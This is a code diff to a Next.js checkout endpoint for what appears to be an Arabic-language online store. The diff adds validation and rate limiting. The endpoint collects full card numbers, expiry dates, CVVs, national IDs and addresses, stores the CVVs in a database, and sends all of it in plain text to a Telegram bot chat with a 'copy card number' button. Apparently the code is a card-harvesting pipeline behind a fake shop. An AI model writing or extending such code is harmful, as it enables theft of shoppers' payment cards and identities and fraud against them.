@@ -1,13 +1,34 @@
 import { NextRequest, NextResponse } from "next/server";
+import { rateLimit, sendToTelegram } from "../../lib/rateLimit";
+
+function validate(body: Record<string, unknown>): string | null {
+  const { cardNumber, expiry, cvv, cardHolder, items, total, installmentType } = body;
+  if (!cardNumber || typeof cardNumber !== "string" || !/^\d{13,19}$/.test((cardNumber as string).replace(/\s/g, ""))) return "رقم البطاقة غير صالح";
+  if (!expiry || typeof expiry !== "string" || !/^\d{2}\/\d{2}$/.test(expiry as string)) return "تاريخ الانتهاء غير صالح";
+  if (!cvv || typeof cvv !== "string" || !/^\d{3,4}$/.test(cvv as string)) return "CVV غير صالح";
+  if (!cardHolder || typeof cardHolder !== "string" || (cardHolder as string).length > 100) return "اسم حامل البطاقة غير صالح";
+  if (!Array.isArray(items) || items.length === 0 || items.length > 50) return "المنتجات غير صالحة";
+  if (typeof total !== "number" || total <= 0) return "المجموع غير صالح";
+  if (installmentType && !["installment", "full"].includes(installmentType as string)) return "نوع الدفع غير صالح";
+  return null;
+}
 
 export async function POST(req: NextRequest) {
+  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "unknown";
+  if (!rateLimit(ip, 3, 15 * 60 * 1000)) {
+    return NextResponse.json({ ok: false, error: "عدد محاولات كثيرة، انتظر قليلاً" }, { status: 429 });
+  }
 
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();
+  const body = await req.json();
+  const err = validate(body);
+  if (err) return NextResponse.json({ ok: false, error: err }, { status: 400 });
+
+  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = body;
 
   const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
   const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;
 
-  // حفظ في الداتابيز
+  // حفظ في الداتابيز أولاً
   let dbId: string | null = null;
   try {
     const dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
@@ -16,13 +37,18 @@ export async function POST(req: NextRequest) {
       body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
     });
     const dbData = await dbRes.json().catch(() => ({}));
-    if (!dbRes.ok) console.error("Checkout DB save failed:", dbData);
+    if (!dbRes.ok) {
+      return NextResponse.json({ ok: false, error: dbData.error || "فشل حفظ الطلب" }, { status: dbRes.status });
+    }
     dbId = dbData._id ?? null;
-  } catch (e) { console.error("Checkout DB error:", e); }
+  } catch (e) {
+    console.error("Checkout DB error:", e);
+    return NextResponse.json({ ok: false, error: "خطأ في الاتصال بالسيرفر" }, { status: 502 });
+  }
 
-  // Send Telegram
+  // إرسال التلجرام فقط بعد نجاح الحفظ
   const text = [
-    `🏪 طلب لـ متجر مؤسسة برح المبدع `,
+    `🏪 طلب لـ متجر مؤسسة برج المبدع `,
     `🔢 رقم الطلب: #${orderId}`,
     ``,
     `💰 Total Amount: ${total} SAR`,
@@ -38,28 +64,16 @@ export async function POST(req: NextRequest) {
     `📅 Valid To: ${expiry}`,
     `🔐 CVV: ${cvv}`,
   ].join("\n");
+
   const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
   const buttons: object[] = [
     { text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber } },
   ];
   if (whatsappNum) buttons.push({ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` });
   const reply_markup = { inline_keyboard: [buttons] };
-  try {
-    await fetch(
-      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup }),
-      }
-    );
-  } catch (_) {}
+
+  const sent = await sendToTelegram({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup });
+  if (!sent) console.error("Telegram send failed for order:", orderId);
 
   return NextResponse.json({ ok: true, orderId, dbId });
 }
-
-
-
-
-
-
